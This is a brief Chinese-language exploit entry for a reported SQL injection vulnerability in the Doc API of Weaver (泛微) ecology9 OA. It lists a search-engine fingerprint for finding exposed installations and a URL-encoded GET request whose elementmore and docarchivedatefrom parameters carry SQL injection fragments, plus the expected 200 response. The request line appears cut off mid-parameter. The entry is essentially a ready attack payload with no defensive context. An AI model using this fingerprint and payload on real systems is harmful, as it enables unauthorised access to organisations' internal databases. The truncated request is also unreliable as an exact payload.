# 泛微ecology9Doc存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`app="泛微-协同商务系统"`
- **请求**：`GET /api/doc/out/more/list?isNew=1&elementmore=%7B%22srcType%22%3A%20%222%22%2C%20%22srcContent%22%3A%20%22%2A%2F%3D%28%28-1%22%2C%20%22perpage%22%3A%20%2210%22%7D&docarchivedatefrom=a%27OR-1%2F%2Aa&d`
- **响应特征**：200